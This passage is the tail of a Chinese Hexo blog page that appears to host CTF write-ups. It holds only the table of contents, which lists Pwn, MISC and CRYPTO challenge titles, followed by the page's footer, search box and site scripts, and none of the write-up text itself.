href="#%E6%94%BE%E6%9D%BE%E5%BF%83%E6%83%85"><span class="nav-number">1.11.</span> <span class="nav-text">放松心情</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#code"><span class="nav-number">1.12.</span> <span class="nav-text">code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sdzz"><span class="nav-number">1.13.</span> <span class="nav-text">sdzz</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">2.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="nav-number">2.1.</span> <span class="nav-text">第一题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PWN-1-1"><span class="nav-number">2.2.</span> <span class="nav-text">PWN 1_1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SeeUrLeaflets"><span class="nav-number">3.1.</span> <span class="nav-text">SeeUrLeaflets</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#c%E8%AF%AD%E8%A8%80"><span class="nav-number">3.1.1.</span> <span class="nav-text">c语言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php"><span class="nav-number">3.1.2.</span> <span class="nav-text">php</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-%E5%93%AA%E9%87%8C%E6%9C%890-%E6%B5%81%E5%8F%A3%E6%B0%B4"><span class="nav-number">3.2.</span> <span class="nav-text">0?哪里有0[流口水]</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0%E5%AE%BD%E5%BA%A6%E9%9A%90%E5%86%99"><span class="nav-number">3.2.1.</span> <span class="nav-text">0宽度隐写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transfer"><span class="nav-number">3.3.</span> <span class="nav-text">Transfer</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="nav-number">3.3.1.</span> <span class="nav-text">背景知识</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Creat"><span class="nav-number">3.4.</span> <span class="nav-text">Creat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#I-got-smoke"><span class="nav-number">3.5.</span> <span class="nav-text">I_got_smoke</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">3.5.1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">3.5.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PuPp1T%E7%9A%84%E7%A7%98%E5%AF%86"><span class="nav-number">3.6.</span> <span class="nav-text">PuPp1T的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Teyvat"><span class="nav-number">3.7.</span> <span class="nav-text">Teyvat</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-number">4.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-classic"><span class="nav-number">4.1.</span> <span class="nav-text">ez_classic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#StartRSA"><span class="nav-number">4.2.</span> <span class="nav-text">StartRSA</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%83%8C%E6%99%AF%E8%B5%84%E6%96%99"><span class="nav-number">4.2.1.</span> <span class="nav-text">背景资料</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">4.2.2.</span> <span class="nav-text">解题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#definity-EZ-RSA"><span class="nav-number">4.3.</span> <span class="nav-text">definity EZ_RSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#longbutshort"><span class="nav-number">4.4.</span> <span class="nav-text">longbutshort</span></a></li></ol></li></ol>
    </div>
</div>
            </div>
        
    </div>
</div>


                

            </div>



        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2022</span>
              -
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">二木</a>
        </div>
        
            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v0.3.5
Search</a>
        </div>
        
        
    </div>
    <link rel="stylesheet" href="//evan.beee.top/css/waline.css"/>
    <script src="//evan.beee.top/js/waline.js"></script>
    
<link rel="stylesheet" href="/css/regular.min.css">

</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fa-duotone fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-duotone fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>



    
<script src="/js/local-search.js"></script>




    
<script src="/js/code-copy.js"></script>




    
<script src="/js/lazyload.js"></script>



<div class="post-scripts pjax">
    
        
<script src="/js/left-side-toggle.js"></script>

<script src="/js/libs/anime.min.js"></script>

<script src="/js/toc.js"></script>

    
</div>


    
<script src="/js/libs/pjax.min.js"></script>

<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            REDEFINE.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            REDEFINE.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            REDEFINE.refresh();
        });
    });
</script>



</body>
</html>
